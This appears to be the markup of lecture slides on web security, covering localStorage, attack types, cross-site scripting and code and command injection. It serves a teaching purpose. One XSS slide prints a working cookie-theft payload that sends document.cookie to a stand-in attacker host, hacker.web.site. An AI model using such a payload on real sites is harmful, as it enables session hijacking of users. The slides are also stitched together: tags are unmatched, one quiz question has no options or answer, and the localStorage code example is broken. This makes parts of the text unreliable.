						## Revision Question
						In localStorage object data ________
						
						* A) is deleted after the browser has been closed
						* B) is not deleted after the browser has been closed
						* C) can be seen but can not edited
						* D) can be seen as well as edited

						</textarea>
					</section>
					
					<section data-markdown data-transition="slide" data-background="#b0533c" data-background-transition="zoom">
						<textarea data-template>
						## Answer
						
						* Answer **B)** is not deleted after the browser has been closed
						
						---
						
						Explanation: Data with no expiration date is stored by localStorage object. Here the data is not deleted if we close the browser. We can have data at the next day or week or year. 
						
						```
						localStorage(“firstname”,”Tanya”); 
						alert( localStorage.getItem(“firstname”) );
						```
						
						</textarea>
					</section>
				</section>

						## Revision Question
						What is the web storage limit of character storage for chrome 30.0 in localStorage?

					<section data-markdown data-transition="slide" data-background="#20533c" data-background-transition="zoom">

				<section data-markdown style="text-align: left;">
					<textarea data-template>
						## Passive Attack 
						
						**Passive** attack attempts to take the information from the system and does not affect any system resources or its operation
						
						
						## Active Attack 
						
						**Active** attacks attempt to change the system resources or affect their usual operation 
						
					</textarea>
				</section>
				
				
				<section data-markdown style="text-align: left;">
					<textarea data-template>
						## Insider Attack 
						
						* An insider attack is a malicious attack perpetrated on a network or computer system by a person with **authorised system access**
						* An insider attack is also known as an **insider threat**
						
						
						## Phishing Attack 
						
						* In phishing attack the hacker creates a **fake web site** that looks exactly like a popular site 
					</textarea>
				</section>
				
								
				<section data-markdown style="text-align: left;">
					<textarea data-template>
						## Hijack Attack 
						
						In a hijack attack, a hacker **takes over a session** between a user and a server and disconnects the user from the communication  
					
						## Spoofing Attack 
						
						**Modifies** the **source** address of the packet
					</textarea>
				</section>
				
												
				<section data-markdown style="text-align: left;">
					<textarea data-template>
						## Exploit Attack 
						* A Security **Vulnerability** is a weakness, flaw, or error in a security system that could be exploited to violate the system’s security policy						
						* An **Exploit** is the use of software, data or commands to **exploit** a vulnerability in a computer system or program to carry out some form of **malicious intent** 

<!--					
						* Example is denial-of-service **(DoS)** attack, Trojan, worms or virus
-->
					</textarea>
				</section>

						## Cross-Site Scripting (XSS) example
						
						* Guestbooks, wikis, blogs, reviews etc alow user comments

						* XSS reflection vulnerability
							- malicious code supplied to site 
							- subsequently displayed to other users

						> `Thanks for this information, its great!<script>document.location=` <!-- .element: style="font-size:50%;" -->		
						> `'http://hacker.web.site/cookie.cgi?'+document.cookie</script>` <!-- .element: style="font-size:50%;" -->
						
					</textarea>
				</section>
												
				<section data-markdown style="text-align: left;">
					<textarea data-template>
						## Cross-Site Scripting (XSS)
						
						* Assumption is that all content from one site is equally trusted
							- hence permitted to interact with other content from that site <!-- .element: style="font-size:80%;" -->
							
						* Client side scripts, e.g. Javascript, ActiveX assumed to come from application on site
						
						* They allowed to access cookie details, user session, etc
						
						* Need to **validate data** supplied 

					</textarea>
				</section>

						## Code Injection 
						
						Happens when there is **no input validation**
						
						Hacker is able to **inject** his code into your code 
					</textarea>

				<section data-markdown style="text-align: left;">
					<textarea data-template>
						## Code Injection 
						
						**Execute Code Injection**						

						PHP's **eval()** function accepts a string to be executed as PHP code
		
						<br/>
						
						**Regular Expression Injection**
						
						PHP's **preg_replace()** (string replacement)
						allow **"e"** modifier which means the replacement string **evaluated** as PHP
						
						Untrusted input used in the replacement string could be used to inject PHP code to be executed
					</textarea>
				</section>
				

				
				<section data-markdown style="text-align: left;">
					<textarea data-template>
						## Code Injection **Prevention**
						
						* Use input **validation**
						  - Never relay on Javascsript **only** validate user data
						* Checks/constraints
						  - list of allowable instructions
						
					</textarea>
				</section>
				
				<section data-background="images/sec-inj4.png" data-background-size="contain">
				</section>
				
				<section data-markdown style="text-align: left;">
					<textarea data-template>
						## Command Injection 
						
						Happens when there is no input validation (or input encoding)
						
						Hacker is able to **inject** code to execute OS commands
						
						**One of the most critical attacks**
						
						For example PHP's **system()** function accepts system commands to be excuted
				
						
					</textarea>
				</section>
